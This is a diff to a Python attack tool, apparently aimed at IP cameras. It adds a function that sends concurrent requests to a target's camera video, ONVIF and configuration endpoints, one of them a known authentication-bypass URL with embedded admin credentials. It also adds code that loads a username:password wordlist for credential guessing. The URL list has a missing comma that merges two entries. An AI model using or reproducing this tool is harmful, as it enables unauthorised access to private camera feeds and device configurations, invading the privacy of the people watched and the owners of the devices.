@@ -28,7 +28,6 @@ from impacket import smb3, ntlm
 from collections import OrderedDict
 import datetime
 import command
-from bypass_camara import SolicitudHandler
 
 def clear():
     if os.name == 'nt':
@@ -195,6 +194,34 @@ class Colors:
     DEFAULT = '\033[0m'
     RED = '\033[91m'
     YELLOW = '\033[93m'
+
+
+def enviar_solicitud(ip, port, carga_cancelada, resultados):
+    urls = [
+        f'http://{ip}:{port}/video.mjpg',
+        f'http://{ip}:{port}/cgi-bin/viewer/video.jpg',
+        f'http://{ip}:{port}/onvif/Media',
+        f'http://{ip}:{port}/System/configurationFile?auth=YWRtaW46MTEK',
+        f'http://{ip}:{port}/pda.htm',
+        f'http://{ip}:{port}/main.htm',
+        f'http://{ip}:{port}/video.cgi?',
+        f'http://{ip}:{port}/web/mobile.html',
+        f'http://{ip}:{port}/asp/video.cgi'
+        f'http://{ip}:{port}/serverpush.htm'
+    ]
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        futures = [executor.submit(enviar_solicitud_individual, ip, port, url, carga_cancelada, resultados) for url in set(urls)]
+        concurrent.futures.wait(futures)
+
+usuarios = {}
+
+# Cargar el wordlist desde el archivo de texto si se proporciona
+if command.args.w:
+    with open(command.args.w, 'r') as file:
+        for line in file:
+            key, value = line.strip().split(':')
+            usuarios[key] = value
 
 
 def manejar_respuesta(ip, port, url, response, usuario, contraseña, carga_cancelada, resultados):
